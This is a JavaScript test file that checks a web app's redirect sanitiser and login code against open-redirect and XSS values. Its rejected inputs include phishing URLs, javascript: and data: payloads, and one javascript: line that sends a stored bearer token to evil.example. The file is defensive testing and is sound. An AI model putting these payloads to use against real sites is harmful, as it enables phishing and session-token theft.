import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { test } from "node:test";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");

function read(rel) {
  return readFileSync(join(ROOT, rel), "utf8");
}

const { safeInternalPath } = await import("../src/lib/auth/safe-redirect.ts");

test("safeInternalPath keeps in-app paths and query/hash", () => {
  assert.equal(safeInternalPath("/settings", "/"), "/settings");
  assert.equal(safeInternalPath("/saved?tab=keys", "/"), "/saved?tab=keys");
  assert.equal(safeInternalPath("/card/abc#top", "/"), "/card/abc#top");
  assert.equal(safeInternalPath(undefined, "/settings"), "/settings");
  assert.equal(safeInternalPath("", "/settings"), "/settings");
});

test("safeInternalPath rejects open-redirect and javascript XSS values", () => {
  const fallback = "/settings";
  assert.equal(safeInternalPath("https://evil.example/phish", fallback), fallback);
  assert.equal(safeInternalPath("http://evil.example", fallback), fallback);
  assert.equal(safeInternalPath("//evil.example/phish", fallback), fallback);
  assert.equal(safeInternalPath("/\\evil.example", fallback), fallback);
  assert.equal(safeInternalPath("javascript:alert(1)", fallback), fallback);
  assert.equal(safeInternalPath("/javascript:alert(1)", fallback), fallback);
  assert.equal(
    safeInternalPath("javascript:fetch('https://evil.example/?t='+sessionStorage.getItem('grok-auth.bearer-token'))", fallback),
    fallback,
  );
  assert.equal(safeInternalPath("data:text/html,phish", fallback), fallback);
  assert.equal(safeInternalPath("/https://evil.example", fallback), fallback);
});

test("login search and signIn both sanitize callbackURL before navigation", () => {
  const login = read("src/routes/login.tsx");
  assert.match(login, /safeInternalPath/);
  assert.match(login, /@\/lib\/auth\/safe-redirect/);
  assert.match(login, /safeInternalPath\(/);
  assert.match(login, /"\/settings"/);

  const client = read("src/lib/auth/client.ts");
  assert.match(client, /safeInternalPath\(opts\.callbackURL, "\/"\)/);
  assert.match(client, /safeInternalPath\(opts\.errorCallbackURL, "\/"\)/);
  assert.match(client, /if \(dest\.origin !== here\.origin\) return;/);
  assert.match(client, /window\.location\.assign\(dest\.href\)/);
  assert.doesNotMatch(client, /window\.location\.href = callbackURL/);
});
